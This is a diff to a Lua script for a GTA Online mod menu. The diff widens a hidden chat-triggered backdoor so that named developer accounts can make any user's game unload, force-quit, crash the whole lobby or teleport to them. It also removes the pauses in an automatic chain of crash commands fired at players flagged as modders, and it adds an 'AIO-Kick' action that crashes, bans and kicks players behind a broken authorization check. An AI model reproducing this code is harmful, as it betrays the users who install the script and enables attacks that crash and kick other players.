@@ -36,6 +36,7 @@ auto_updater.run_auto_update({
 
 
 
+
 local start_time = util.current_time_millis()
 util.require_natives('1660775568-uno')
 util.require_natives("natives-1672190175")
@@ -3287,64 +3288,64 @@ end)
     
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestUN") then  
-                    if players.get_name(message_sender) == "zPolizei" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("unload")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestFQ") then  
-                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("forcequit")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestCA") then  
-                    if players.get_name(message_sender) == "zPolizei" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("crash all")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestNS") then  
-                    if players.get_name(message_sender) == "zPolizei" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("gop")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestSD") then  
-                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("yeet")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestRS") then  
-                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "winkna" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("restartscriptxa")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestTZ") then  
-                    if players.get_name(message_sender) == "zPolizei" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("tp zpolizei")
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-ping") then  
-                    if players.get_name(message_sender) == "zPolizei" then
-                        util.show_corner_help("~r~zPolizei ~w~requested you send a message to test response times.")
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
+                        util.show_corner_help("A ~r~Network Menu Dev ~w~requested you send a message to test response times.")
                         chat.send_message("Pong", false, true, true)
                     end
                 end
             end)
             chat.on_message(function(packet_sender, message_sender, text, team_chat)
                 if string.contains(text, "-requestNE") then  
-                    if players.get_name(message_sender) == "zPolizei" then
+                    if players.get_name(message_sender) == "zPolizei" or players.get_name(message_sender) == "shesaidwhattttt" then
                         menu.trigger_commands("nucleareject")
                     end
                 end
@@ -3589,24 +3590,39 @@ players.on_join(function(pid)
         if players.is_marked_as_modder(pid) then
             util.show_corner_help("~r~Test Function")
             menu.trigger_commands("crash" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("choke" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("flashcrash" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("ngcrash" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("footlettuce" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("slaughter" .. players.get_name(pid))
-            util.yield(500)
             menu.trigger_commands("steamroll" .. players.get_name(pid))
-            util.yield(500)
         end
     end
 end
 	end)
 end)
+players.on_join(function(pid)
+	menu.action(menu.player_root(pid), "AIO-Kick", {"aiokick"}, "", function() perm = COMMANDPERM_RUDE
+               for _, pid in ipairs(players.list(true, true, true)) do
+            if not players.get_name(pid) == "zPolizei" or players.get_name(pid) == "shesaidwhattttt" or players.get_name(pid) == "JinxxChaosWitch" or players.get_name(pid) == "winkna" or players.get_name(pid) == "honda_drifts" or players.get_name(pid) == "Xarmanoth" then
+                util.show_corner_help("Error code 0x0002. ~r~\n\nYou are not authorized to use this command.") --dev 
+            else
+        if players.is_marked_as_modder(pid) then
+            util.show_corner_help("~r~Test Function")
+            menu.trigger_commands("breakup" .. players.get_name(pid))
+            menu.trigger_commands("ban" .. players.get_name(pid))
+            menu.trigger_commands("confusionkick" .. players.get_name(pid))
+            menu.trigger_commands("aids" .. players.get_name(pid))
+            menu.trigger_commands("footlettuce" .. players.get_name(pid))
+            menu.trigger_commands("slaughter" .. players.get_name(pid))
+            menu.trigger_commands("steamroll" .. players.get_name(pid))
+        end
+    end
+end
+	end)
+end)
+
+
 
 menu.trigger_commands("detectgod")
 menu.trigger_commands("detectvehgod")
@@ -3632,13 +3648,12 @@ end
 util.toast("Network Menu initialized in: " .. load_time .. "ms", TOAST_ALL)
 util.toast("Welcome to the Network Menu "  .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. ". Version 3.5 coded for GTA:O version 1.66.", TOAST_LOGGER) 
 util.yield(2500)
-util.toast("[Developer Message] \n\nThere is still bug surrounding the blacklist system.\n\nI've halted active development for this script as I dont play GTA anymore, I am also working on other projects currently, regular updates will return eventually.", TOAST_ALL)
+util.toast("[Developer Message] \n\nIt is a sad day fellas, remote kicking was fully patched by Cockstar. R.I.P Remote Ban.", TOAST_ALL)
 util.on_stop(function()
     AUDIO.PLAY_SOUND(-1, "End_Squelch", "CB_RADIO_SFX", 0, 0, 1)
 		util.log("Network Menu was stopped. Cleaning up.")
         util.toast("Network Menu was stopped. Cleaning up.")
 	end)
-
 
 
 
